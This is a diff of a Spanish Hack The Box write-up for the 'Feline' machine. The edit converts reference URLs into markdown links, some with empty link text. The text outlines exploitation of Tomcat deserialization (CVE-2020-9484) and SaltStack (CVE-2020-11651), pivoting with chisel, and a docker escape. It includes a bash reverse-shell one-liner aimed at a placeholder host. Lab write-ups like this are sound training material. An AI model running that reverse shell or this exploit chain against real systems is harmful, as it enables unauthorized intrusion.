@@ -96,10 +96,10 @@ De este mensaje de error podemos deducir 2 cosas:
 * La ruta donde se suben los ficheros.
 * El hecho de que java no procesa de manera correcta el parametro filename cuando va vacio.
 
-Haciendo un poco de investigacion sobre la tecnología del servidor (apache tomcat 9.0.27) vemos que hay una vulnerabilidad reciente de deserialización en java (https://iotsecuritynews.com/apache-tomcat-rce-by-deserialization-cve-2020-9484-write-up-and-exploit0/) la cual podemos usar para obtener una rce.
+Haciendo un poco de investigacion sobre la tecnología del servidor (apache tomcat 9.0.27) vemos que hay una vulnerabilidad reciente de [deserialización en java](https://iotsecuritynews.com/apache-tomcat-rce-by-deserialization-cve-2020-9484-write-up-and-exploit0/) la cual podemos usar para obtener una rce.
 
 Para comprobar que realmente es vulnerable vamos a usar el siguiente repo de github:
-* https://github.com/masahiro331/CVE-2020-9484
+* [](https://github.com/masahiro331/CVE-2020-9484)
 
 Para esta comprobacion solo necesitamos el archivo groovy.session
 
@@ -115,10 +115,10 @@ Sabiendo todo esto vamos a proceder a generar el payload con el que vamos a expl
 ## Generación del payload y explotación
 
 Para generar nuestro payload vamos a utilizar la herramienta ysoserial:
-* https://github.com/frohoff/ysoserial
+* [](https://github.com/frohoff/ysoserial)
 
 Para generar nuestro payload me he basado en esta web: 
-* https://book.hacktricks.xyz/pentesting-web/deserialization#exploit
+* [](https://book.hacktricks.xyz/pentesting-web/deserialization#exploit)
 
 Para nuestra rce, el payload que vamos a generar es una reverse shell en bash:
 * ```bash -i >& /dev/tcp/<IP>/<Puerto> 0>&```
@@ -173,15 +173,15 @@ contiguos.
 
 Vamos a buscar info sobre el posible servicio que esta corriendo en los puertos.
 Empezamos por el 4505:
-* https://www.speedguide.net/port.php?port=4505
+* [](https://www.speedguide.net/port.php?port=4505)
 
 Puerto 4506:
-* https://www.speedguide.net/port.php?port=4506
+* [](https://www.speedguide.net/port.php?port=4506)
 
 Vemos que corresponden con el servicio saltmaster.
 Saltmaster o Saltstack es un software relacionado con la automatización de sistemas it a traves de eventos programados.
-* https://en.wikipedia.org/wiki/Salt_%28software%29
-* https://docs.saltstack.com/en/getstarted/system/communication.html
+* [](https://en.wikipedia.org/wiki/Salt_%28software%29)
+* [](https://docs.saltstack.com/en/getstarted/system/communication.html)
 
 Como podemos ver en el link anteriror saltstack utiliza 2 puertos. el 4505(publisher) y el
 4506(request server).
@@ -189,7 +189,7 @@ Como podemos ver en el link anteriror saltstack utiliza 2 puertos. el 4505(publi
 Con esta informacion sobre la tecnología vamos a buscar exploits.
 
 En la pagina de wikipedia de este framework, podemos ver al final un apartado de vulnerabilidades, el cual es muy interesante, ya que vemos una vulnerabilidad reciente referente a este servicio la cual nos daria una rce.
-* https://nvd.nist.gov/vuln/detail/CVE-2020-11651
+* [](https://nvd.nist.gov/vuln/detail/CVE-2020-11651)
 
 
 ---
@@ -203,7 +203,7 @@ Con chisel vamos a exponer el puerto 4506 para poder lanzar desde nuestra máqui
 
 para la explotacion de este servicio vamos a usar un exploit de exploitdb el cual implemeta
 checks para ver si realmente el servicio es vulnerable
-* https://www.exploit-db.com/exploits/48421
+* [](https://www.exploit-db.com/exploits/48421)
 
 Este exploit su aprovecha de los CVEs cve-2020-11651 y cve-2020-1652.
 Como podemos observar, nos confirma que que el servico es vulnerable
@@ -225,7 +225,7 @@ vamos a subir el script de linpeas para ver por donde podemos intentar escalar p
 
 ![feline-dockershockets-hacktricks](/assets/imagenes/2021-02-20-feline-HTB/feline-dockershockets-hacktricks.png)
 
-* https://www.redtimmy.com/a-tale-of-escaping-a-hardened-docker-container/
+* [](https://www.redtimmy.com/a-tale-of-escaping-a-hardened-docker-container/)
 
 Vamos a proceder a la explotación de docker:
 
